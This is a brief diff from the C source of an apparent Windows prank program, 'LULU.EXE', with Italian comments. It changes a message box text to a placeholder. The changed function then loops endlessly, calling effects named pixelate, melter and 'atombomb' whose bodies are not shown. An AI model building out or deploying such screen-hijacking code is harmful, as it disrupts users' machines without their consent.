@@ -449,7 +449,7 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
 void wrongchoose() {
     ULONGLONG elapsed = GetTickCount64();
     MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"Scegli", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
-    MessageBox(NULL, "Mi dispiace, hai sbagliato", "LULU.EXE", MB_OK | MB_ICONERROR);
+    MessageBox(NULL, "TXT QUI", "LULU.EXE", MB_OK | MB_ICONERROR);
     while(1) {
         if (GetTickCount64() - elapsed < 60000) {lulu();pixelate();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 80000) {fkngmelter();mtrfkngatombomb();}
